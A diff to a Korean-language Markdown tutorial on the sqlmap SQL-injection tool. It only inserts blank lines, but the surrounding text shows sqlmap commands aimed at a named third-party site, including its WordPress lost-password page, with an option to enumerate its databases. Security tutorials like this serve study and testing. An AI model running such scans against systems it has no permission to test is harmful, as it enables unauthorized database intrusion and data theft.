@@ -28,6 +28,7 @@ sqlmap을 사용하려면 우선 파이썬(*Python*) 2.x 버전을 설치해야 
 > 여기서는 `https://www.gachon.com/?s=hello` 라는 URL을 입력했다.
 
 `./sqlmap.py -u https://www.gachon.com/?s=hello -v 3`
+
 `./sqlmap.py -u https://www.gachon.com/wp-login.php?action=lostpassword -v 3`
 > 마지막에 `-v 3` 옵션을 주면 분석 과정 중 어떤 패턴들이 넘어가는지 확인할 수 있다.
 
@@ -54,6 +55,7 @@ sqlmap 명령을 한 번 실행하면 더 이상 SQL 질의 및 삽입 공격을
 이번에는 --dbs 옵션을 사용해서 DB 정보를 획득 시도를 진행하겠다.
 
 `./sqlmap.py -u https://www.gachon.com/?s=hello --dbs -v 3`
+
 `./sqlmap.py -u https://www.gachon.com/wp-login.php?action=lostpassword --dbs -v 3`
 
 아래 화면을 보자.
